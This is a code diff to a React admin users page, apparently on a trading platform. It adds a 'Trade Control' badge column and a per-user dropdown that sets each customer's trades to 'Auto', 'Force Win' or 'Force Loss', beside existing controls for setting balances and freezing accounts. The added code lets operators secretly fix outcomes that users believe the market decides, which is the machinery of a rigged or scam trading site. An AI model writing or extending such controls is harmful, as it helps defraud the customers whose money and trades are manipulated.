@@ -3,6 +3,7 @@ import React, { useState, useEffect } from "react";
 import DataTable from "../../components/DataTable";
 import Modal from "../../components/Modal";
 import { getAllUsers, setUserBalance, freezeUser } from "../../services/adminService";
+import { setUserTradeControl } from "../../services/tradeSettingsService";
 import "./Users.css";
 
 export default function Users() {
@@ -101,6 +102,28 @@ export default function Users() {
             )
         },
         {
+            header: "Trade Control",
+            key: "tradeControl",
+            render: (value) => {
+                const mode = value || 'auto';
+                const colors = {
+                    auto: '#06b6d4',
+                    force_win: '#10b981',
+                    force_loss: '#ef4444'
+                };
+                const labels = {
+                    auto: 'Auto',
+                    force_win: 'Force Win',
+                    force_loss: 'Force Loss'
+                };
+                return (
+                    <span className="badge" style={{ background: colors[mode], color: 'white' }}>
+                        {labels[mode]}
+                    </span>
+                );
+            }
+        },
+        {
             header: "Joined",
             key: "createdAt",
             render: (value) => value ? new Date(value).toLocaleDateString() : '-'
@@ -124,6 +147,32 @@ export default function Users() {
             >
                 {row.frozen ? 'Unfreeze' : 'Freeze'}
             </button>
+            <select
+                className="action-btn"
+                value={row.tradeControl || 'auto'}
+                onChange={async (e) => {
+                    try {
+                        await setUserTradeControl(row.id, e.target.value);
+                        await loadUsers();
+                    } catch (error) {
+                        console.error("Error setting trade control:", error);
+                    }
+                }}
+                style={{
+                    padding: '8px 12px',
+                    cursor: 'pointer',
+                    background: 'rgba(6, 182, 212, 0.1)',
+                    border: '1px solid rgba(6, 182, 212, 0.3)',
+                    borderRadius: '6px',
+                    color: '#06b6d4',
+                    fontWeight: 600,
+                    fontSize: '13px'
+                }}
+            >
+                <option value="auto" style={{ background: '#1a1f2e', color: '#06b6d4' }}>Auto</option>
+                <option value="force_win" style={{ background: '#1a1f2e', color: '#10b981' }}>Force Win</option>
+                <option value="force_loss" style={{ background: '#1a1f2e', color: '#ef4444' }}>Force Loss</option>
+            </select>
         </>
     );
 
